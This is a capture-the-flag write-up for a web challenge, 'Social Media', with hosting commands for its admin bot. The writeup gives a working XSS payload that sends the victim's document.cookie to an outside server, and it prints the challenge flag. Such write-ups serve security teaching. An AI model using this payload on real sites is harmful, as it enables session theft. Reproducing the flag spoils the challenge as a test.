# Social Media
Level: Hard

Description:
```
We are creating a new social media platform called "Unhackable"!! And just to prove it, we've decided to hire you to make sure that it really *is* unhackable. If you find something fishy, send a link to our admin who will fix it!

FYI - to make sure you don't conspire against us, the "Find Friends" feature is disabled!

Site - http://byuctf.xyz:40005

Admin bot - http://byuctf.xyz:40006

Source code: [socialmedia.zip]
```

## Writeup
Basic XSS situation - the flag is the cookie of the admin. If you send a link of an infected note to the admin bot, the JavaScript code will be executed and they can grab the flag. A payload such as `<img src="x" onerror="var myImage = new Image(100, 200); myImage.src = &quot;https://justinapplegate.me/flag?cookie=&quot;+document.cookie;">` will work, and the flag can be found in the access logs of https://justinapplegate.me. 

**Flag** - `byuctf{xss_1s_a_v3ry_common_m3thod_of_attack!}`

## Hosting
The main website can be spun up by running `python3 unhackable.py` from the local directory. The admin bot uses a Docker container that makes a webserver that can be accessed port 40006. All the proper files are included in here. The command to build the docker container is (when located inside of the `admin-bot` directory):

```bash
sudo docker build -t adminbot1 .
```

The command to start the challenge is:

```bash
sudo docker run -p 40006:1337 --detach --name adminbot1 adminbot1:latest
```

The command to stop the challenge (since `CTRL+C` won't work) is:

```bash
sudo docker stop adminbot1
```